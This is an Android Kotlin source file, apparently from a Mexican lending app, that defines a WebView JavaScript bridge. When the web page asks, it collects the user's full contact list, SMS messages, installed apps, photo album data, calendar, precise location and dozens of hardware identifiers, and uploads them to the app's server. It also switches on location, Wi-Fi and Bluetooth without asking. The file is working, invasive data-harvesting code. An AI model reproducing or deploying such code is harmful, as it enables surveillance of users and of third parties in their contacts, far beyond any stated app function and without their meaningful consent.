package com.fly.mexicoapp.js

import android.annotation.SuppressLint
import android.app.Activity
import android.content.*
import android.database.Cursor
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.SystemClock
import android.provider.ContactsContract
import android.webkit.WebView
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.FragmentActivity
import androidx.lifecycle.ViewModelStoreOwner
import com.blankj.utilcode.util.DeviceUtils
import com.blankj.utilcode.util.ToastUtils
import com.fly.mexicoapp.MyApplication
import com.fly.mexicoapp.activity.BaseWebActivity
import com.fly.mexicoapp.bean.*
import com.fly.mexicoapp.bean.event.HttpEvent
import com.fly.mexicoapp.js.bean.CommentParseDataBean
import com.fly.mexicoapp.utils.*
import com.fly.mexicoapp.utils.Cons.JS_KEY_ALBUM_PHOTO
import com.fly.mexicoapp.utils.Cons.JS_KEY_APPS_FLYER
import com.fly.mexicoapp.utils.Cons.JS_KEY_CALENDERS_PHOTO
import com.fly.mexicoapp.utils.Cons.JS_KEY_CALL_PHONE
import com.fly.mexicoapp.utils.Cons.JS_KEY_CONTACT_INFO
import com.fly.mexicoapp.utils.Cons.JS_KEY_COPY
import com.fly.mexicoapp.utils.Cons.JS_KEY_DEVICE_INFO
import com.fly.mexicoapp.utils.Cons.JS_KEY_INSTALLATION_INFO
import com.fly.mexicoapp.utils.Cons.JS_KEY_LOCATION_INFO
import com.fly.mexicoapp.utils.Cons.JS_KEY_LOGOUT
import com.fly.mexicoapp.utils.Cons.JS_KEY_NEW_VIEW
import com.fly.mexicoapp.utils.Cons.JS_KEY_SELECT_CONTACT
import com.fly.mexicoapp.utils.Cons.JS_KEY_SMS_INFO
import com.fly.mexicoapp.utils.Cons.JS_KEY_TACK_PHOTO
import com.fly.mexicoapp.utils.Cons.JS_KEY_USER_INFO
import com.fly.mexicoapp.utils.Cons.SELECT_CONTACTS_CONTRACT
import com.fly.mexicoapp.weight.UpdateDialog
import com.google.gson.Gson
import com.hjq.permissions.OnPermissionCallback
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class AppJsParseData constructor(webView: WebView, viewModelStoreOwner: ViewModelStoreOwner) {
    private var mWebView: WebView
    private var mViewModelStoreOwner: ViewModelStoreOwner
    private var photoFile: File? = null
    private var eventTackPhotoId: String = ""
    private var eventTackPhotoType: String = ""
    private var eventSelectContactId: String = ""

    init {
        mWebView = webView;
        mViewModelStoreOwner = viewModelStoreOwner
    }

    fun parseData(data: Any?, event: String, id: String) {
        when (event) {
            JS_KEY_COPY -> copy(id, data)
            JS_KEY_USER_INFO -> getUserInfo(id)
            JS_KEY_LOGOUT -> logout(id)
            JS_KEY_CONTACT_INFO -> eventContactInfo(id)
            JS_KEY_DEVICE_INFO -> evenDeviceInfo(id)
            JS_KEY_LOCATION_INFO -> eventLocationInfo(id)
            JS_KEY_INSTALLATION_INFO -> eventInstallationInfo(id)
            JS_KEY_SMS_INFO -> eventSmsInfo(id)
            JS_KEY_TACK_PHOTO -> eventTackPhoto(id,data)
            JS_KEY_ALBUM_PHOTO -> eventAlbumInfo(id)
            JS_KEY_CALENDERS_PHOTO -> eventCalendersInfo(id)
            JS_KEY_SELECT_CONTACT -> eventSelectContact(id)
            JS_KEY_CALL_PHONE -> eventCallPhone(id,data)
            JS_KEY_APPS_FLYER -> eventAppsFlyer(id,data)
            JS_KEY_NEW_VIEW -> eventNewView(id,data)
        }
    }

    /**
     * 选择通讯录
     */
    private fun eventSelectContact(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.Group.CONTACTS)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: List<String>, all: Boolean) {
                    if (all) {
                        eventSelectContactId = id
                        ActivityManager.getCurrentActivity()?.startActivityForResult(
                            Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI), SELECT_CONTACTS_CONTRACT)
                    }else{
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_SELECT_CONTACT)
                    }
                }

                override fun onDenied(permissions: List<String>, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_SELECT_CONTACT)
                }
            })
    }

    /**
     *打电话
     */
    private fun eventCallPhone(id: String, data: Any?) {
        try {
            var commentParseDataBean = Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            val phone: String = commentParseDataBean.value
            val intent = Intent(Intent.ACTION_DIAL, Uri.parse("tel:$phone"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            MyApplication.application.startActivity(intent)
            CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_CALL_PHONE)
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(mWebView, id, JS_KEY_CALL_PHONE, "Los parámetros son incorrectos.")
        }
    }

    /**
     * 埋点
     */
    private fun eventAppsFlyer(id: String, data: Any?) {
        try {
            var commentParseDataBean = Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            AppsFlyerUtil.postAF(commentParseDataBean.value)
            CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_APPS_FLYER)
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(mWebView, id, JS_KEY_APPS_FLYER, "Los parámetros son incorrectos.")
        }
    }

    /**
     * 跳转新的页面
     */
    private fun eventNewView(id: String, data: Any?) {
        try {
            var commentParseDataBean = Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            BaseWebActivity.openWebView(ActivityManager.getCurrentActivity() as AppCompatActivity,commentParseDataBean.value,false)
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(mWebView, id, JS_KEY_NEW_VIEW, "Los parámetros son incorrectos.")
        }
    }


    /**
     * 复制
     */
    private fun copy(id: String, data: Any?) {
        try {
            var commentParseDataBean =
                Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            val clipboardManager =
                MyApplication.application.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clipData = ClipData.newPlainText("Label", commentParseDataBean.value)
            clipboardManager.setPrimaryClip(clipData)
            CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_COPY)
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(
                mWebView,
                id,
                JS_KEY_COPY,
                "Los parámetros son incorrectos."
            )
        }
    }

    /**
     * 获取用户信息
     */
    private fun getUserInfo(id: String) {
        CallBackJS.callBackJsSuccess(
            mWebView,
            id,
            JS_KEY_USER_INFO,
            UserInfoManger.getUserInfoJson()
        )
    }

    /**
     * 退出登录
     */
    private fun logout(id: String) {
        UserInfoManger.logout()
        CallBackJS.callBackJsSuccess(mWebView, id, JS_KEY_LOGOUT)
    }

    /**
     * 通讯录信息
     */
    private fun eventContactInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.Group.CONTACTS).request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var contactInfoBeans = ContactUtil.getContactInfoList()
                            withContext(Dispatchers.Main) {
                                var applyInfoBean= ApplyInfoBean()
                                applyInfoBean.phonebook_info = contactInfoBeans
                                HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_CONTACT_INFO)
                                if (contactInfoBeans!=null) {
                                    LogUtils.d("通讯录：${contactInfoBeans.toString()}")
                                }
                            }
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_CONTACT_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_CONTACT_INFO)
                }
            })
    }

    /**
     * 设备信息
     */
    private fun evenDeviceInfo(id: String) {
        DeviceInfoUtil.openLocService()
        DeviceInfoUtil.openWifi()
        DeviceInfoUtil.openBluetooth()
        GlobalScope.launch(Dispatchers.IO) {
            PublicIP.requestIp()
        }
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.ACCESS_FINE_LOCATION)
            .permission(Permission.ACCESS_COARSE_LOCATION)
            .permission(Permission.READ_PHONE_STATE)
            .permission(Permission.Group.BLUETOOTH)
            .permission(Permission.Group.STORAGE)
            .permission(Permission.Group.CONTACTS)
            .request(object : OnPermissionCallback {
                @SuppressLint("MissingPermission")
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        if (!DeviceInfoUtil.isLocServiceEnable() || !DeviceInfoUtil.isOpenWifi() || !DeviceInfoUtil.isOpenBluetooth()) {
                            CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_DEVICE_INFO)
                            return
                        }
                        GlobalScope.launch(Dispatchers.IO) {
                            LogUtils.d("需要等待ip,开启WiFi后需要等待一段时间才可进行抓取")
                            Thread.sleep(2000)
                            var batteryBean = BatteryUtil.getBatteryBean()
                            var deviceInfoBean = DeviceInfoBean()
                            deviceInfoBean.regWifiAddress =
                                DeviceInfoUtil.regWifiAddress().toString()
                            deviceInfoBean.wifiList = DeviceInfoUtil.getWifiList()
                            deviceInfoBean.imei = DeviceInfoUtil.getIMEI()
                            deviceInfoBean.imsi = DeviceInfoUtil.getAndroidID().toString()
                            deviceInfoBean.phoneModel = Build.MODEL
                            deviceInfoBean.phoneVersion = Build.VERSION.RELEASE
                            deviceInfoBean.macAddress = DeviceUtils.getMacAddress()
                            deviceInfoBean.availableSpace = DeviceInfoUtil.getAvailableSpace()
                            deviceInfoBean.sensorCount = DeviceInfoUtil.getSensorCount()
                            deviceInfoBean.totalRam = DeviceInfoUtil.getTotalRam()
                            deviceInfoBean.deviceName = DeviceInfoUtil.getDeviceName().toString()
                            deviceInfoBean.isRooted = if (DeviceUtils.isDeviceRooted()) {
                                "1"
                            } else {
                                "0"
                            }
                            deviceInfoBean.basebandVer = DeviceInfoUtil.getBasebandVersion()
                            deviceInfoBean.screenResolution =
                                DeviceInfoUtil.getScreenResolution().toString()
                            deviceInfoBean.ip = DeviceInfoUtil.getIPAddress().toString()
                            deviceInfoBean.deviceCreateTime = DateTool.getTimeFromLong(
                                DateTool.FMT_DATE_TIME,
                                System.currentTimeMillis()
                            ).toString()
                            deviceInfoBean.battery_temper =
                                CommonUtil.stringToInt(batteryBean.temperature)
                            deviceInfoBean.cores = Runtime.getRuntime().availableProcessors()
                            deviceInfoBean.app_max_memory =
                                DeviceInfoUtil.getTotalMemory().toString()
                            deviceInfoBean.app_free_memory =
                                DeviceInfoUtil.getAvailMemory().toString()
                            deviceInfoBean.update_mills = SystemClock.uptimeMillis()
                            deviceInfoBean.elapsed_realtime = SystemClock.elapsedRealtime()
                            deviceInfoBean.network_type =
                                NetUtils.getNetWorkStateName(MyApplication.application)
                            deviceInfoBean.is_simulator = if (DeviceUtils.isEmulator()) {
                                1
                            } else {
                                0
                            }
                            deviceInfoBean.android_id = DeviceInfoUtil.getAndroidID().toString()
                            deviceInfoBean.time_zone_id = DeviceInfoUtil.getTimeZoneId().toString()
                            deviceInfoBean.battery = batteryBean
                            deviceInfoBean.locale_ios3_country =
                                DeviceInfoUtil.getLocaleIos3Country().toString()
                            deviceInfoBean.locale_display_language =
                                DeviceInfoUtil.getLocaleDisplayLanguage().toString()
                            deviceInfoBean.gaid = DeviceInfoUtil.getGAID().toString()
                            deviceInfoBean.wifi_ssid = DeviceInfoUtil.regWifiSSID().toString()
                            deviceInfoBean.wifi_mac = deviceInfoBean.regWifiAddress
                            deviceInfoBean.longitude =
                                LocationUtil.getLocation()?.longitude.toString()
                            deviceInfoBean.latitude =
                                LocationUtil.getLocation()?.latitude.toString()
                            deviceInfoBean.sdk_public_ip = PublicIP.getIp().toString()
                            deviceInfoBean.isUsingProxyPort = if (DeviceInfoUtil.isWifiProxy()) {
                                "true"
                            } else {
                                "false"
                            }
                            deviceInfoBean.isUsingVPN = if (DeviceInfoUtil.checkVPN()) {
                                "true"
                            } else {
                                "false"
                            }
                            deviceInfoBean.isUSBDebug = if (DeviceInfoUtil.checkUsbStatus()) {
                                "true"
                            } else {
                                "false"
                            }
                            deviceInfoBean.bluetooth_saved =
                                DeviceInfoUtil.fetchAlReadyConnection().toString()
                            deviceInfoBean.sensorList = DeviceInfoUtil.getSensorBeanList()
                            deviceInfoBean.phone_type = DeviceInfoUtil.getPhoneType()
                            deviceInfoBean.language = DeviceInfoUtil.getLanguage().toString()
                            deviceInfoBean.network_operator_name =
                                NetUtils.getOperatorName().toString()
                            deviceInfoBean.locale_iso_3_language =
                                DeviceInfoUtil.getLocaleIos3Country().toString()
                            deviceInfoBean.build_fingerprint = Build.FINGERPRINT
                            deviceInfoBean.cur_wifi_ssid = DeviceInfoUtil.regWifiSSID().toString()
                            deviceInfoBean.DownloadFiles = FileUtil.getDownloadFile().size
                            deviceInfoBean.battery_status = batteryBean.status
                            deviceInfoBean.is_usb_charge =
                                if (batteryBean.plugged == BatteryManager.BATTERY_PLUGGED_USB) {
                                    1
                                } else {
                                    0
                                }
                            deviceInfoBean.is_ac_charge =
                                if (batteryBean.plugged == BatteryManager.BATTERY_PLUGGED_AC) {
                                    1
                                } else {
                                    0
                                }
                            deviceInfoBean.AudioInternal = 0
                            deviceInfoBean.nettype =
                                NetUtils.getNetworkState(MyApplication.application).toString()
                            deviceInfoBean.iccid1 = DeviceInfoUtil.getICCID1().toString()
                            deviceInfoBean.serial = Build.SERIAL
                            deviceInfoBean.kernel_architecture = Build.CPU_ABI
                            deviceInfoBean.build_id = Build.ID
                            deviceInfoBean.ImagesInternal = 0
                            deviceInfoBean.build_number = Build.VERSION.RELEASE
                            deviceInfoBean.ContactGroup =
                                ContactUtil.getContactInfoList().size.toString()
                            deviceInfoBean.gsfid = DeviceInfoUtil.getGsfAndroidId().toString()
                            deviceInfoBean.board = Build.BOARD
                            deviceInfoBean.VideoInternal = 0
                            deviceInfoBean.AudioExternal = FileUtil.getAudioFile().size
                            deviceInfoBean.build_time =
                                DateTool.getTimeFromLong(DateTool.FMT_DATE_TIME1, Build.TIME)
                                    .toString()
                            deviceInfoBean.wifiCount = deviceInfoBean.wifiList!!.size
                            deviceInfoBean.time_zone = DeviceInfoUtil.getTimeZone().toString()
                            deviceInfoBean.release_date =
                                DateTool.getTimeFromLong(DateTool.FMT_DATE_TIME1, Build.TIME)
                                    .toString()
                            deviceInfoBean.iccid2 = DeviceInfoUtil.getICCID2().toString()
                            deviceInfoBean.meid = DeviceInfoUtil.getMeidOnly().toString()
                            deviceInfoBean.ImagesExternal = FileUtil.getImagesFile().size
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                deviceInfoBean.security_patch_level = Build.VERSION.SECURITY_PATCH
                            }
                            deviceInfoBean.API_level = Build.VERSION.SDK_INT.toString()

                            withContext(Dispatchers.Main) {
                                val applyInfoBean= ApplyInfoBean()
                                val deviceInfoBeans = ArrayList<DeviceInfoBean>()
                                deviceInfoBeans.add(deviceInfoBean)
                                applyInfoBean.device_info = deviceInfoBeans
                                HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id, JS_KEY_DEVICE_INFO)
                                LogUtils.d("设备信息：${deviceInfoBean}")
                            }
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_DEVICE_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_DEVICE_INFO)
                }
            })
    }

    /**
     * 位置信息
     */
    private fun eventLocationInfo(id: String) {
        DeviceInfoUtil.openLocService()
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.ACCESS_FINE_LOCATION)
            .permission(Permission.ACCESS_COARSE_LOCATION)
            .permission(Permission.READ_PHONE_STATE)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        if (!DeviceInfoUtil.isLocServiceEnable()) {
                            CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_LOCATION_INFO)
                            return
                        }
                        GlobalScope.launch(Dispatchers.IO) {
                            var locationBean = LocationBean()
                            var location = LocationUtil.getLocation()
                            locationBean.geo_time = DateTool.getTimeFromLong(
                                DateTool.FMT_DATE_TIME,
                                System.currentTimeMillis()
                            ).toString()
                            if (location != null) {
                                locationBean.latitude = location.latitude.toString()
                                locationBean.longtitude = location.longitude.toString()
                                val address =
                                    LocationUtil.getAddress(location.latitude, location.longitude)
                                if (address != null) {
                                    locationBean.location = address.getAddressLine(0)
                                    locationBean.gps_address_province = address.subLocality
                                    locationBean.gps_address_city = address.locality
                                    locationBean.gps_address_street = address.featureName
                                }
                            }
                            withContext(Dispatchers.Main) {
                                LogUtils.d("位置信息：${locationBean}")
                                var applyInfoBean= ApplyInfoBean()
                                val locationBeans= ArrayList<LocationBean>()
                                locationBeans.add(locationBean)
                                applyInfoBean.geo_info = locationBeans
                                HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id, JS_KEY_LOCATION_INFO)
                            }
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_LOCATION_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_LOCATION_INFO)
                }
            })
    }

    /**
     * 安装信息
     */
    private fun eventInstallationInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_PHONE_STATE)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var apps = InstallationUtil.getInstallationInfos()
                            withContext(Dispatchers.Main) {
                                LogUtils.d("安装信息：${apps}")
                                var applyInfoBean= ApplyInfoBean()
                                applyInfoBean.applist_info = apps
                                HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_INSTALLATION_INFO)
                            }
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_INSTALLATION_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_INSTALLATION_INFO)
                }
            })
    }

    /**
     * 短信信息
     */
    private fun eventSmsInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_SMS)
            .permission(Permission.Group.CONTACTS)
            .permission(Permission.READ_PHONE_STATE)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var smss = SmsUtil.getSmsList()
                            withContext(Dispatchers.Main) {
                                LogUtils.d("短信信息：${smss}")
                                var applyInfoBean= ApplyInfoBean()
                                applyInfoBean.sms_info = smss
                                HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_SMS_INFO)
                            }
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_SMS_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_SMS_INFO)
                }
            })
    }

    /**
     * 拍照上传
     */
    private fun eventTackPhoto(id: String, data: Any?) {
        try {
            var commentParseDataBean = Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            eventTackPhotoType = commentParseDataBean.value
            XXPermissions.with(ActivityManager.getCurrentActivity())
                .permission(Permission.Group.STORAGE)
                .permission(Permission.CAMERA)
                .request(object : OnPermissionCallback {
                    override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                        if (all) {
                            eventTackPhotoId = id
                            photoFile = CommonUtil.tackPhoto()
                        } else {
                            CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_TACK_PHOTO)
                        }
                    }

                    override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_TACK_PHOTO)
                    }
                })
        } catch (e: Exception) {
            e.printStackTrace()
            CallBackJS.callbackJsErrorOther(mWebView, id, JS_KEY_CALL_PHONE, "Los parámetros son incorrectos.")
        }

    }

    var imageDataSource = ImageDataSource()

    /**
     * 相册信息
     */
    private fun eventAlbumInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.Group.STORAGE)
            .permission(Permission.READ_PHONE_STATE)
            .permission(Permission.ACCESS_MEDIA_LOCATION)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        imageDataSource.setOnImageLoadListener(object :ImageDataSource.OnImageLoadListener{
                            override fun onImageLoad(imageFolders: ArrayList<AlbumInfoBean>) {
                                imageDataSource.unOnImageLoadListener()
                                GlobalScope.launch(Dispatchers.IO) {
                                    var albumInfoBeans = imageFolders
                                    LogUtils.d("相册信息：${albumInfoBeans.size}+${albumInfoBeans}")
                                    withContext(Dispatchers.Main) {
                                        var applyInfoBean= ApplyInfoBean()
                                        applyInfoBean.album_info = albumInfoBeans
                                        HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_ALBUM_PHOTO)
                                    }
                                }
                            }
                        })
                        GlobalScope.launch(Dispatchers.Main){
                            imageDataSource.load(ActivityManager.getCurrentActivity() as FragmentActivity)
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_ALBUM_PHOTO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_ALBUM_PHOTO)
                }
            })
    }

    /**
     * 日历信息
     */
    private fun eventCalendersInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.Group.CALENDAR)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO){
                            var calendersInfoBeans = CalendersUtil.getCalendersList()
                            LogUtils.d("日历信息：${calendersInfoBeans}")
                            withContext(Dispatchers.Main){
                                var applyInfoBean= ApplyInfoBean()
                                applyInfoBean.calenders_info = calendersInfoBeans
                                HttpEvent.uploadApplyInfo( applyInfoBean,mWebView,id,JS_KEY_CALENDERS_PHOTO)
                            }
                        }
                    } else {
                        CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_CALENDERS_PHOTO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    CallBackJS.callbackJsErrorPermissions(mWebView, id, JS_KEY_CALENDERS_PHOTO)
                }
            })
    }

    fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == Cons.TACK_PHOTO) {
            if (resultCode == Activity.RESULT_OK) {
                //自拍信息
                LoadingUtil.showLoading()
                GlobalScope.launch(Dispatchers.IO) {
                    var file: File? = null
                    photoFile?.let {
                        LogUtils.d("压缩前：" + it.length())
                        file = ImageUtils.compressImage(it.absolutePath)
                        LogUtils.d("压缩后：" + (file?.length() ?: "0"))
                    }
                    withContext(Dispatchers.Main) {
                        if (file == null) {
                            CallBackJS.callbackJsErrorOther(mWebView, eventTackPhotoId, JS_KEY_TACK_PHOTO, "La carga de la imagen falló.")
                        }
                        file?.let {
                            HttpEvent.uploadImage(it,eventTackPhotoType, mWebView, eventTackPhotoId, JS_KEY_TACK_PHOTO)
                        }
                    }
                }
            } else {
                CallBackJS.callbackJsErrorOther(mWebView, eventTackPhotoId, JS_KEY_TACK_PHOTO, "Ninguno.")
            }
        } else if (requestCode == SELECT_CONTACTS_CONTRACT){
            if (resultCode == Activity.RESULT_OK) {
                val contactBean = ContactInfoBean()
                if (data == null || data.data == null) {
                    CallBackJS.callbackJsErrorOther(mWebView, eventSelectContactId, JS_KEY_SELECT_CONTACT,"Ninguno")
                    return
                }
                var cursor:Cursor? = null
                var phone :Cursor? = null
                try {
                    val reContentResolverol: ContentResolver = MyApplication.application.contentResolver
                    cursor = reContentResolverol.query(data.data!!, null, null, null, null)
                    cursor?.let {
                        it.moveToFirst()
                        contactBean.name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                        // 条件为联系人ID
                        val contactId = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                        // 获得DATA表中的电话号码，条件为联系人ID,因为手机号码可能会有多个
                        phone = reContentResolverol.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null)
                        phone?.let { p->
                            while (p.moveToNext()) {
                                contactBean.mobile = p.getString(p.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            }
                        }
                    }
                }catch (e:Exception){
                    e.printStackTrace()
                }finally {
                    phone?.close()
                    cursor?.close()
                }
                CallBackJS.callBackJsSuccess(mWebView,eventSelectContactId,JS_KEY_SELECT_CONTACT,Gson().toJson(contactBean))
            }else{
                CallBackJS.callbackJsErrorOther(mWebView, eventSelectContactId, JS_KEY_SELECT_CONTACT,"Ninguno")
            }
        }
    }
}